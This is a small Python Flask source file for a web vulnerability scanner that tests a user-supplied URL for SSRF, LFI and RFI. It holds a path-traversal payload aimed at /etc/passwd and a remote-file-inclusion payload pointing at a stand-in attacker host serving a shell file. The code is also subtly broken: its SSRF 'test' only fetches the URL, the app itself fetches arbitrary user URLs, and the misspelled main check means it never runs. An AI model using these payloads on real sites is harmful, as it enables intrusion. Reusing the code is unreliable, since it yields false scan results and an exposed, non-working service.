from flask import Flask, request, render_template
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    url = request.form['url']
    results = {
        'ssrf': scan_ssrf(url),
        'csrf': scan_csrf(url),
        'lfi': scan_lfi(url),
        'rfi': scan_rfi(url),
    }
    return render_template('results.html', results=results)

def scan_ssrf(url):
    # Example SSRF scan (basic and not comprehensive)
    try:
        response = requests.get(url, timeout=5)
        return f'SSRF test successful with status code {response.status_code}'
    except Exception as e:
        return f'SSRF test failed: {e}'

def scan_csrf(url):
    # Example CSRF scan
    return 'CSRF scan not implemented'

def scan_lfi(url):
    # Example LFI scan (basic and not comprehensive)
    payload = '../../../../etc/passwd'
    test_url = f'{url}?file={payload}'
    try:
        response = requests.get(test_url, timeout=5)
        if 'root:' in response.text:
            return 'LFI vulnerability found'
        else:
            return 'LFI vulnerability not found'
    except Exception as e:
        return f'LFI test failed: {e}'

def scan_rfi(url):
    # Example RFI scan (basic and not comprehensive)
    payload = 'http://malicious.com/shell.txt'
    test_url = f'{url}?file={payload}'
    try:
        response = requests.get(test_url, timeout=5)
        if 'remote shell' in response.text:
            return 'RFI vulnerability found'
        else:
            return 'RFI vulnerability not found'
    except Exception as e:
        return f'RFI test failed: {e}'

if __name__== '_main_':
    app.run(debug=True)